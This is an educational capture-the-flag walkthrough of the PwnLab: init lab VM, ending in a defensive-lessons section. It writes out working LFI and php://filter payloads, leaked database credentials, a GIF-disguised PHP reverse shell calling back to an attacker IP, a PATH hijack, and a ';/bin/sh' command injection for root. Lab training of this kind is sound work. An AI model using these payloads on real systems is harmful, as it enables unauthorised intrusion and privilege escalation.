# PwnLab: init — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | PwnLab: init |
| **Difficulty** | Easy |
| **Author** | Claor |
| **Released** | August 1, 2016 |
| **VulnHub Entry** | [PwnLab: init on VulnHub](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Download** | [PwnLab: init OVA](https://vulnhub.com/entry/pwnlab-init,158/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Debian) |

> **Goal:** get `root` and read the flag in `/root/flag.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Local File Inclusion (LFI):** how a page that includes a file based on user input lets you read files you should never see.
- **PHP filter wrappers:** how `php://filter/convert.base64-encode` leaks the *source code* of a PHP page, not just its rendered output.
- **Database enumeration:** using leaked MySQL credentials to dump a users table and recover password hashes.
- **Cookie manipulation:** how a `lang` cookie that is trusted blindly becomes an execution primitive.
- **File upload bypass:** passing image-only upload filters by spoofing a GIF magic header while hiding PHP inside a `.gif`.
- **Reverse shells:** turning code execution into an interactive shell on your listener.
- **SUID abuse / PATH hijacking:** how a SUID binary that calls `cat` without a full path lets you become another user.
- **Command injection:** how a root SUID helper that concatenates your input into a shell command gives away root.
- **Defensive thinking:** what a developer or sysadmin should have done differently at each step.

## 1. Reconnaissance — finding the target

We first need the target's IP address on our isolated lab network.

**Check your own (attacker) IP:**
```bash
ip a
```

> **How to read it:** Lists your network interfaces and their IPs. Use the address on your host-only / NAT lab network (often `eth1`, `vmnet1`, or `vboxnet0`). In this guide the attacker is `192.168.56.10`.

**Discover live hosts on the subnet:**

Method A — `arp-scan` (common on Kali):
```bash
sudo arp-scan --localnet
```

Method B — `netdiscover`:
```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each live host is shown with its MAC address. The PwnLab VM will appear as a new Linux-style host on the subnet.
> **Why it works:** ARP requests are answered by every live host on the local segment, even ones that block ICMP ping.

**Ping sweep (optional confirmation):**
```bash
sudo nmap -sn 192.168.56.0/24
```

![host discovery showing the target IP](images/01-recon.png)

## 2. Enumeration — open ports and services

### 2.1 Full TCP port scan
```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. `--min-rate 1000` pushes packets faster (fine in a local lab). `-T4` is an aggressive timing template. `-oA` saves the results in three formats.
> **Why it works:** Scanning every port means we do not miss a service hiding on a non-standard port.

### 2.2 Service and version detection
```bash
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's default safe scripts, `-sV` fingerprints the service versions, and the port list focuses the scan. Adjust the port list to whatever the full scan found.

Realistic output for PwnLab: init (exact banners may vary by build):
```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL (unauthorized)
```

> **How to read it:** There is a web server on port 80 (Apache, serving PHP), RPC on 111, and a **MySQL** server on 3306 that answers connections from our attacker host.
> **Why it works:** An exposed MySQL service that accepts remote connections is a huge hint — it may hold credentials. The Apache service tells us to inspect the web application closely.

![nmap showing ports 80, 111 and 3306](images/02-nmap.png)

### 2.3 Web application discovery
Browse to `http://192.168.56.101/`.

Realistic landing page:
```text
[ Home ] [ Login ] [ Upload ]
```

> **How to read it:** A simple PHP site with a login and an upload form. Notice the URLs look like `http://192.168.56.101/?page=login` — the `page` parameter controls which file is loaded. That is our first red flag.

Run a quick web scanner too:
```bash
nikto -h http://192.168.56.101/
```

> **How to read it:** Nikto flags interesting paths such as `/config.php`. A file named `config.php` usually contains database credentials.
> **Why it works:** Automated scanners surface common filenames and misconfigurations fast, giving us leads to verify manually.

## 3. Foothold — from LFI to a shell

### 3.1 Confirm the LFI
The homepage loads a file from the `page` parameter. Try reading a system file:
```bash
curl "http://192.168.56.101/?page=../../../../etc/passwd"
```

> **How to read it:** If the page echoes the contents of `/etc/passwd`, we have a Local File Inclusion. The application literally runs `include($_GET['page'].".php")`, so it appends `.php` — which blocks reading files that do not end in `.php`.

### 3.2 Bypass the `.php` suffix with a PHP filter wrapper
Because a plain path gets `.php` appended, use a **stream wrapper** to read arbitrary `.php` files and see their raw source:
```bash
curl "http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=config"
```

> **Why it works:** `php://filter/convert.base64-encode` runs the file through a Base64 encoder *before* it is included. We receive the file's source as Base64 text, then decode it ourselves. This works for `config`, `login`, `upload`, and `index` (the wrapper sits in front, so the appended `.php` is harmless).

Realistic output (a long Base64 blob):
```text
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0K...
```

Decode it:
```bash
echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
```

Decoded result:
```text
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

> **How to read it:** We now have the MySQL root password `H4u%QJ_H99` and the database name `Users`. Do the same trick with `resource=login` and `resource=upload` later to understand the checks.

![Base64-decoded config.php showing database credentials](images/03-lfi-config.png)

### 3.3 Dump the database
Connect to the remote MySQL server.
```bash
mysql -h 192.168.56.101 -u root -p
```

Enter the password `H4u%QJ_H99` when prompted. Then:
```text
MySQL [(none)]> show databases;
MySQL [(none)]> use Users;
MySQL [(Users)]> show tables;
MySQL [(Users)]> select * from users;
```

Realistic output:
```text
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

> **Why it works:** The database stores passwords Base64-encoded (the `==` padding is a giveaway). Decode each one:
```bash
echo "Sld6WHVCSkpOeQ==" | base64 -d   # -> JWzXuBJJNy
echo "U0lmZHNURW42SQ==" | base64 -d   # -> SIfdsTEn6I
echo "aVN2NVltMkdSbw==" | base64 -d   # -> iSv5Ym2GRo
```

> **Note:** The exact hashes/plaintext vary slightly between writeups but the pattern is always `kent`, `mike`, `kane` with Base64-encoded passwords.

### 3.4 Log in and read the upload code
Log into the web app (e.g. `kent` with the decoded password) at `http://192.168.56.101/?page=login`. You now see the upload form. Read its source with the same LFI trick:
```bash
curl "http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=upload" | base64 -d
```

Decoded (simplified):
```php
$whitelist = array(".jpg",".jpeg",".gif",".png");
if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension...'); }
if (strpos($filetype,'image') === false) { die('Error 001'); }
if ($imageinfo['mime'] != 'image/gif' && ... ) { die('Error 002'); }
$uploadfile = $uploaddir . md5(basename($filename)) . $file_ext;
```

> **How to read it:** Only image extensions are allowed, the MIME type must contain `image`, and the file must pass `getimagesize()` (i.e. look like a real image). The saved filename is `md5(name).ext` — we cannot choose it, so we must find the name another way (the page prints the image path after upload).

### 3.5 Build a GIF+PHP reverse shell
We combine a real GIF header (to satisfy `getimagesize()` and MIME checks) with PHP code, keeping the `.gif` extension.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit `shell.php` and set `$ip = '192.168.56.10';` and `$port = 4444;`. Then place a GIF magic header at the very top and rename:
```bash
{ echo -n 'GIF89a'; cat shell.php; } > shell.gif
```

> **Why it works:** `getimagesize()` sees the `GIF89a` signature and reports `image/gif`; the `.gif` extension passes the whitelist. The PHP interpreter ignores the GIF header and executes the PHP that follows — *if* the file is included as PHP.

![Preparing the GIF reverse shell](images/04-payload.png)

### 3.6 Upload, then trigger via the `lang` cookie
Upload `shell.gif` through the authenticated upload form and note the returned path, e.g.:
```text
upload/5f4dcc3b5aa765d61d8327deb882cf99.gif
```

Recall `index.php` (from our earlier read) contains this unfinished code:
```php
if (isset($_COOKIE['lang'])) { include("lang/".$_COOKIE['lang']); }
```

> **How to read it:** The server blindly includes whatever path is in the `lang` cookie. Because there is **no `.php` appended** here, we can point it at our uploaded `.gif` and the server will execute the PHP inside.

> **Why it works:** This is a second LFI — a *cookie-based* one. It bypasses the `.php`-only limitation of the `page` parameter.

Start a listener:
```bash
nc -lvnp 4444
```

Trigger the shell:
```bash
curl -b "lang=../upload/5f4dcc3b5aa765d61d8327deb882cf99.gif" http://192.168.56.101/index.php
```

Realistic listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44822
Linux pwnlab 3.16.0-4-686-pae ... GNU/Linux
www-data@pwnlab:/var/www/html$
```

> **How to read it:** We now have a shell as `www-data` (the web server user). Upgrade it for convenience:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/05-wwwdata-shell.png)

## 4. Privilege escalation — www-data to root

### 4.1 www-data → kane
The database passwords are reused as **local login passwords**. Switch users (from inside your shell):
```bash
su - kent      # password: JWzXuBJJNy  (nothing interesting here)
su - kane      # password: iSv5Ym2GRo
```

> **How to read it:** `kent` has nothing useful. `kane`'s home directory contains an interesting file:
```bash
ls -la /home/kane
```
```text
-rwsr-sr-x 1 mike mike 5148 Mar 17 2016 msgmike
```

> **How to read it:** The `s` in `-rwsr-sr-x` and owner `mike` mean `msgmike` is **SUID** — it runs with `mike`'s privileges no matter who launches it.

### 4.2 kane → mike via SUID + PATH hijack
Inspect what the binary does:
```bash
strings /home/kane/msgmike
```
```text
...
cat /home/mike/msg.txt
...
```

> **How to read it:** `msgmike` runs the `cat` command **without a full path**. The shell searches `$PATH` from left to right for `cat`. If we put our own `cat` earlier in `$PATH`, our file runs instead — as `mike`.

Create a malicious `cat` and hijack `$PATH`:
```bash
cd /home/kane
echo "/bin/bash" > cat
chmod +x cat
export PATH=/home/kane:$PATH
./msgmike
```

> **Why it works:** When `msgmike` calls `cat`, the shell finds `/home/kane/cat` first. That script launches `/bin/bash`, and because `msgmike` is SUID to `mike`, the resulting shell is `mike`:
```text
$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

Restore your PATH when done:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 4.3 mike → root via command injection in `msg2root`
As `mike`, look at your home directory:
```bash
cd /home/mike
ls -la
strings msg2root
```
```text
...
/bin/echo %s >> /root/messages.txt
...
```

> **How to read it:** `msg2root` is another SUID binary (owned by root). It takes your message and runs, as root:
```text
/bin/echo <your input> >> /root/messages.txt
```
> Because your input is concatenated into a shell command **without quoting**, you can inject a command separator (`;`) and run anything as root.

Escalate directly:
```bash
./msg2root
```
At the `Message for root:` prompt, enter:
```text
;/bin/sh
```

> **Why it works:** The shell executes `/bin/echo ;/bin/sh >> /root/messages.txt`. The `;` ends the `echo`, and `/bin/sh` runs — as root, because the binary is SUID root.
```text
# id
uid=0(root) gid=0(root) groups=0(root),1003(kane)
```

> **Alternative:** Create a tiny C program that calls `setuid(0); system("/bin/sh");`, compile it, and invoke it through the same injection (`; ./setuid`). Directly injecting `/bin/sh` is simpler.

### 4.4 Capture the flag
```bash
cd /root
ls -la
cat flag.txt
```

```text
(_ ___) If you are reading this, means that you have break 'init' (_ ___)
```

> **Note:** the exact flag text varies by build and writeup — do not rely on a specific string.

![root shell and flag](images/06-root-flag.png)

## 5. Summary of vulnerabilities

| Vulnerability | Where | Impact | Notes |
|---|---|---|---|
| Local File Inclusion via `page` parameter | `index.php` (`include($_GET['page'].".php")`) | Read arbitrary PHP source (via `php://filter`) | Leaked `config.php` DB credentials |
| Cookie-based LFI | `index.php` (`include("lang/".$_COOKIE['lang'])`) | Code execution of uploaded image | No `.php` suffix — bypasses the page-param limit |
| Sensitive data exposure | `config.php` web-accessible / LFI-readable | DB root credentials | `root:H4u%QJ_H99` |
| Weak password storage | MySQL `Users.users` table | Recover plaintext logins | Passwords Base64-encoded, not hashed |
| Weak upload validation | `upload.php` | Upload PHP inside an image | GIF magic header bypasses MIME/extension checks |
| Exposed remote MySQL | TCP/3306 | Database dump | Accepts remote root logins |
| SUID + PATH hijack | `/home/kane/msgmike` (SUID mike) | Become `mike` | Calls `cat` without an absolute path |
| SUID command injection | `/home/mike/msg2root` (SUID root) | Become `root` | Unquoted input passed to `/bin/echo %s >> ...` |
| Password reuse | DB → local accounts | Lateral movement | `kent`/`kane` reuse DB passwords |

> **How to read it:** The chain is entirely the result of untrusted input reaching an `include`, secrets stored in readable files, passwords reused and weakly encoded, and two careless SUID binaries.

## 6. Defensive lessons (blue team)

- **Never build include paths from user input.** Use a fixed allow-list of pages (e.g. `switch($page){ case 'home': ... }`) instead of `include($_GET['page'])` or a raw cookie value. This single fix removes both LFI bugs.
- **Disable `php://filter` abuse by patching PHP** and, better, stopping the sink entirely. Input filters (blocking `..`, `php://`) are bypassable and should not be the only control.
- **Keep secrets out of the web root** and out of files an LFI can read. `config.php` should live outside the document root and be non-readable by the web user.
- **Hash passwords properly.** Use a slow salted hash (bcrypt/Argon2). Base64 is *encoding*, not encryption — it is trivially reversible.
- **Never reuse passwords** across services or between application accounts and OS accounts.
- **Do not expose databases** to untrusted networks. Bind MySQL to `localhost`, use least-privilege DB users, and firewall TCP/3306.
- **Validate uploads server-side and store them safely.** Re-encode images, store them outside the web root, and never let user files be executed. Do not trust client-supplied MIME types or extensions alone.
- **Audit SUID binaries.** Remove unnecessary SUID bits, and always call external programs by absolute path. Avoid passing user input into a shell (`echo %s`) — use safe APIs.
- **Principle of least privilege** for the web user, and monitor for suspicious outbound connections (reverse shells connect out to the attacker).

## 7. References

Real community writeups consulted during research (same path):

- [PwnLab: init — seekorswim](https://seekorswim.github.io/walkthroughs/2019/05/21/pwnlab-init/)
- [PwnLab: init Writeup — IRONHACKERS](https://ironhackers.es/en/pwnlab-init-writeup-vulnhub/)
- [Vulnhub — PwnLab: init — joenibe](https://joenibe.github.io/vulnhub/pwnlab/)
- [PwnLab: Init – walkthrough — Reedphish](https://reedphish.wordpress.com/2016/09/17/pwnlab-init-walkthrough/)
- [CTF: PwnLab Init Walkthrough — mrjamiebowman](https://www.mrjamiebowman.com/pentest/parrotos/pwnlab-init-walkthrough/)
- [Vulnhub – PwnLab init — Ivan's IT learning blog](https://ivanitlearning.wordpress.com/2020/02/06/vulnhub-pwnlab-init/)
- [VulnHub Official Entry — PwnLab: init](https://vulnhub.com/entry/pwnlab-init,158/)

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap scan showing ports 80, 111, 3306
- [ ] `images/03-lfi-config.png` — Base64-decoded `config.php` (DB credentials)
- [ ] `images/04-payload.png` — building the GIF+PHP reverse shell
- [ ] `images/05-wwwdata-shell.png` — reverse shell as `www-data`
- [ ] `images/06-root-flag.png` — root shell and `/root/flag.txt`

> **How to read it:** Put screenshots in `labs/pwnlab-init/images/` and reference them with relative paths as shown above.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
